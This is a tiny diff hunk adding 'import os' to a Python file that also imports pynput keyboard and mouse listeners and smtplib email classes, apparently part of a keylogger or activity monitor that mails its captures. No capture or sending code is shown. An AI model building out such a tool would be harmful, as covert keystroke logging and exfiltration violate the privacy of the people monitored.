@@ -5,6 +5,7 @@ from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 import json
+import os
 from pynput import keyboard, mouse
 import smtplib
 
